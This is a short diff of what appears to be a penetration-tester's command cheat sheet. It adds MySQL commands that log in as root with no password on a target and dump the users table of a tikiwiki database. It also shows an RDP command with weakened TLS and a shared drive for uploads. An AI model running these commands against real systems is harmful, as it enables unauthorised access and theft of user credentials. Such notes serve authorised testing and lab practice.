@@ -608,8 +608,8 @@ setpriv --reuid=1002 --regid=1002 --clear-groups -- ls -laR
 
 
 [*] (3306) MySQL
-mysql -h "$TARGET" -u root --skip-ssl -e 'show databases;'
-mysql -h "$TARGET" -u root@localhost -e 'show databases;'
+mysql -h localhost -u root --skip-ssl -e 'show databases;'
+mysql -h "$TARGET" -u root --skip-ssl -e 'show databases;use tikiwiki;show tables;select * from users_users\G;'
 
 [*] (3389) RDP
 xfreerdp /v:'$TARGET' /d:'$DOM' -sec-nla /tls-seclevel:0 /dynamic-resolution +clipboard +drive:Downloads,"$HOME/Upload/"
